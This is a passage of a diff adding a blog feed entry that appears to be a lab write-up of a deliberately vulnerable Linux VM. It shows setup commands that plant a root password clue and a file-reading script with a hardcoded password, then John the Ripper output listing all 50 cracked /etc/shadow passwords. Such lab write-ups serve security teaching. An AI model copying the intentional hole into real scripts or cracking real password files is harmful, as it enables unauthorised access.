+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;root:I@47hdlT!@!&quot;</span> <span class="p">|</span> chpasswd
+</span><span class='line'>
+</span><span class='line'><span class="c">#Root password clue in jdavenport&#39;s home dir</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;I ate 47 hot dogs last Tuesday!@!&quot;</span> &gt; /home/jdavenport/svrc.txt
+</span><span class='line'>..
+</span><span class='line'>
+</span><span class='line'><span class="c">#Vulnerable script placed in ccoffee&#39;s home dir with a hidden password</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;#!/bin/bash</span>
+</span><span class='line'><span class="s2">if [ \&quot;\$2\&quot; == \&quot;emerald\&quot; ]; then</span>
+</span><span class='line'><span class="s2">        while read line</span>
+</span><span class='line'><span class="s2">        do</span>
+</span><span class='line'><span class="s2">                echo \$line</span>
+</span><span class='line'><span class="s2">        done &lt; \$1</span>
+</span><span class='line'><span class="s2">else</span>
+</span><span class='line'><span class="s2">        echo &quot;</span>wrong!<span class="s2">&quot;</span>
+</span><span class='line'><span class="s2">fi</span>
+</span><span class='line'><span class="s2">&quot;</span> &gt; /home/ccoffee/scripts/getlogs.sh
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally with this information, we was able to successfully cracked the whole /etc/shadow:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john --show
+</span><span class='line'>root:I@47hdlT!@!:16567:0:::::
+</span><span class='line'>myajima:12345678:16567:0:99999:7:::
+</span><span class='line'>lmartinez:computer:16567:0:99999:7:::
+</span><span class='line'>mbryan:sunshine:16567:0:99999:7:::
+</span><span class='line'>krenfro:master:16567:0:99999:7:::
+</span><span class='line'>dgilfillan:1234:16567:0:99999:7:::
+</span><span class='line'>jduff:welcome:16567:0:99999:7:::
+</span><span class='line'>amaynard:iloveyou:16567:0:99999:7:::
+</span><span class='line'>aallen:pepper:16567:0:99999:7:::
+</span><span class='line'>aadams:trustno1:16567:0:99999:7:::
+</span><span class='line'>aard:123123:16567:0:99999:7:::
+</span><span class='line'>rpatel:password:16567:0:99999:7:::
+</span><span class='line'>qpowers:lifehack:16567:0:99999:7:::
+</span><span class='line'>dstevens:cheese:16567:0:99999:7:::
+</span><span class='line'>bphillips:baseball:16567:0:99999:7:::
+</span><span class='line'>aheflin:football:16567:0:99999:7:::
+</span><span class='line'>mrodriguez:kotaku:16567:0:99999:7:::
+</span><span class='line'>tgoodchap:killer:16567:0:99999:7:::
+</span><span class='line'>djohnson:consumer:16567:0:99999:7:::
+</span><span class='line'>mholland:0:16567:0:99999:7:::
+</span><span class='line'>dtraylor:princess:16567:0:99999:7:::
+</span><span class='line'>bwatkins:jordan:16567:0:99999:7:::
+</span><span class='line'>rjacobson:654321:16567:0:99999:7:::
+</span><span class='line'>jfranklin:qwerty:16567:0:99999:7:::
+</span><span class='line'>swarren:Password:16567:0:99999:7:::
+</span><span class='line'>mnader:michelle:16567:0:99999:7:::
+</span><span class='line'>strammel:letmein:16567:0:99999:7:::
+</span><span class='line'>rdominguez:shadow:16567:0:99999:7:::
+</span><span class='line'>jbresnahan:soccer:16567:0:99999:7:::
+</span><span class='line'>cchisholm:whatever:16567:0:99999:7:::
+</span><span class='line'>aspears:111111:16567:0:99999:7:::
+</span><span class='line'>dwestling:123456:16567:0:99999:7:::
+</span><span class='line'>sjohnson:batman:16567:0:99999:7:::
+</span><span class='line'>hlovell:michael:16567:0:99999:7:::
+</span><span class='line'>tdeleon:gawker:16567:0:99999:7:::
+</span><span class='line'>ccoffee:gizmodo:16567:0:99999:7:::
+</span><span class='line'>jalvarez:blahblah:16567:0:99999:7:::
+</span><span class='line'>jalcantar:nintendo:16567:0:99999:7:::
+</span><span class='line'>sgains:dragon:16567:0:99999:7:::
+</span><span class='line'>bbanter:12345:16567:0:99999:7:::
+</span><span class='line'>lmorales:jennifer:16567:0:99999:7:::
+</span><span class='line'>jayala:666666:16567:0:99999:7:::
+</span><span class='line'>kclemons:monkey:16567:0:99999:7:::
+</span><span class='line'>aharp:passw0rd:16567:0:99999:7:::
+</span><span class='line'>kwebber:superman:16567:0:99999:7:::
+</span><span class='line'>dgrant:internet:16567:0:99999:7:::
+</span><span class='line'>jdavenport:babyl0n:16567:0:99999:7:::
+</span><span class='line'>ktso:starwars:16567:0:99999:7:::
+</span><span class='line'>aweiland:abc123:16567:0:99999:7:::
+</span><span class='line'>dcooper:pokemon:16567:0:99999:7:::
+</span><span class='line'>
+</span><span class='line'>50 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is also a trace that the root user connected via ssh to another server with IP address 192.168.1.20:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat .ssh/known_hosts
+</span><span class='line'>192.168.1.20 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3ViCbImH/GTN+b1DigEYLnrUSHk8J7ZEt6+IX1etXQx89VQXhKAh098dpoUIAlnYIIsCcvmqHSwbCY0JxwwoV7bHqfQB/y05hWv//hQ6hhOIJBJfTOuezAgMxEbZbfaEJf5U3ROhGd4TbdIrsaoPruQ9asG/ok6yrWfKBK6pcizIxL/Q+uvRlcC8X=</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kioptrix: Level 2]]></title>
